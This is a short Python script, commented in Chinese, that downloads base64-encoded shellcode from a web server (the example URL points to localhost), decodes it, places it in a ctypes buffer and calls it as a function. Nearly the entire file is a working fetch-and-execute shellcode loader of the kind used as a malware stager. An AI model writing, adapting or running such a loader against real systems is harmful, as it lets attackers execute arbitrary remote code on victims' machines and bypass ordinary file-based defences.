# -*- coding: utf-8 -*-
# @Time    : 2017/10/25 上午11:53
# @Author  : 逍遥哥哥
# @Email   : hellocatmao@gmail.com
# @File    : Execute_ShellCode.py
# @Software: PyCharm

'''


Python方式的shellcode执行

利用reuquests模块从Web服务器上下载base64编码的shellcode然后执行

'''
import requests
import ctypes
import base64

#从服务器下载shellcode
code_url = 'http://127.0.0.1/shellcode.bin'
response = requests.get(code_url)

#base64解码shellcode
shellcode = base64.b64decode(response.text)

#申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

#创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

#执行shellcode

shellcode_func()